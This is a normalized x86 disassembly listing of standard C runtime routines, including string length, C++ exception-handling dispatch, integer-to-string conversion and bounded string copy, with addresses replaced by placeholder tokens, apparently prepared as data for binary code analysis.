call sub_41d10e
mov eax [ ebp - 0x20 ]
push 0xc
call sub_4251cf
pop ecx
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x6c ]
mov eax ebx
call sub_41c410
and [ ebp - 0x4 ] 0x0
call sub_41d0d1
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
call sub_41cd83
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_421265
retn
push ebx
call sub_41f419
push ebx
call sub_41f4b2
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0xc
call sub_4251cf
pop ecx
mov [ ebp - 0x4 ] 0x2
lea edi [ esi + 0x6c ]
push ebx
push edi
call sub_41f5fd
push ebx
call sub_41f419
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_41e140
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_41d0dd
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] edi
push [ edi ]
push rw-data
call sub_41f5fd
pop ecx
pop ecx
mov eax [ rw-data ]
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
sub_41d120
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_41d1ab
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
js r-xdata
call sub_427040
mov esi [ eax ]
call sub_427040
cmp esi [ eax ]
jl r-xdata
call sub_427046
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_41d1d3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_41e7f9
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_41d1ab
push eax
push edi
push esi
call sub_41e063
add esp 0x10
test eax eax
jne r-xdata
push 0x1
push edi
call sub_41c26e
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41ef83
int3
mov eax esi
jmp r-xdata
mov eax r--data
pop edi
sub_41d248
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_419ff3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
pop ecx
sub_41d26f
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_41e140
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_41d2ce
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_41e872
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_41e872
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_41e872
and [ eax + 0x90 ] 0x0
jmp sub_41eba4
sub_41d31d
push 0x10
push r--data
call sub_421220
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41d3df
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_41e872
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_421265
retn
call sub_41ebf0
call sub_41ebf0
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_41ec40
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_41d3f9
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_41e872
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_41d43e
push 0x8
push r--data
call sub_421220
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_421265
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_41a857
mov [ ebp - 0x4 ] 0xfffffffe
sub_41d493
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_41d4cd
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_41ebf0
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_41d26f
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_41d591
push 0x2c
push r--data
call sub_421220
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_41ab04
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_41e872
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_41e872
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_41e872
mov [ eax + 0x88 ] esi
call sub_41e872
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_41aba9
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_41d6b7
mov eax [ ebp - 0x1c ]
call sub_421265
retn
sub_41d62a
mov esp [ ebp - 0x18 ]
call sub_41e872
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_41d31d
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_41d6b7
mov eax [ ebp - 0x1c ]
call sub_421265
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_41d6b7
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_41ab57
pop ecx
call sub_41e872
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_41e872
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_41ab30
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_41d43e
pop ecx
pop ecx
sub_41d72d
push 0xc
push r--data
call sub_421220
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_42704c
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_42704c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41ebf0
push ebx
push esi
call sub_42704c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_42704c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_42704c
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_42704c
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_42704c
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_42704c
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_41a460
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_42704c
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_41d493
pop ecx
pop ecx
push eax
push esi
call sub_41a460
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_421265
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_41d493
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_41d8ac
push 0x8
push r--data
call sub_421220
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_41d493
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_41a857
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_41d72d
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_421265
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_41d493
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_41a857
jmp r-xdata
sub_41d93e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_41d8ac
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_41a825
call sub_41a85e
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_41d31d
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_41d591
add esp 0x28
test eax eax
je r-xdata
sub_41d9ac
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_41e872
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_41e872
lea edi [ eax + 0x80 ]
call sub_41e6c2
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_41aa91
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_41ebf0
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_41a91b
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_41d93e
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_41dab3
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_41ebf0
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_41e872
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_41ebf0
call sub_41eba4
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_41d9ac
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_41e872
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_41e872
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_41e872
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_42704c
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_41aa91
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_41ebf0
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_41d43e
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_41e872
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_41e872
mov edi [ eax + 0x94 ]
call sub_41e872
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_41d4cd
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_41d4cd
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_41a0b6
test al al
jne r-xdata
call sub_41ebf0
cmp eax 0x19930522
jne r-xdata
call sub_41e872
call sub_41e872
call sub_41e872
mov [ eax + 0x88 ] esi
call sub_41e872
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_41d26f
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_41d43e
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_419f97
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_41ac98
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_41d93e
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_41a85e
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_41d31d
add esp 0x10
push [ esi + 0x1c ]
call sub_41d548
sub_41de45
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_41e872
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_41dab3
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_41d31d
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41df2b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
call sub_41efd5
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_41c34a
push 0x16
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_41c34a
push 0x22
jmp r-xdata
pop edi
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
call sub_41efd5
mov eax esi
jmp r-xdata
mov edi ecx
xor ebx ebx
inc ebx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] dl
inc ecx
inc ebx
test eax eax
je r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ esi ] 0x0
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_41dfe5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_41df2b
pop ebp
retn
sub_41e00f
call sub_42714a
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_427157
pop ecx
push 0x3
call sub_41f338
int3
push 0x1
push 0x40000015
push 0x3
call sub_41ee5a
add esp 0xc
sub_41e042
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_41e063
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_41c34a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_41efd5
mov eax esi
jmp r-xdata
sub_41e0c2
push 0xc
push r--data
call sub_421220
push 0xe
call sub_4251cf
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41e129
call sub_421265
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
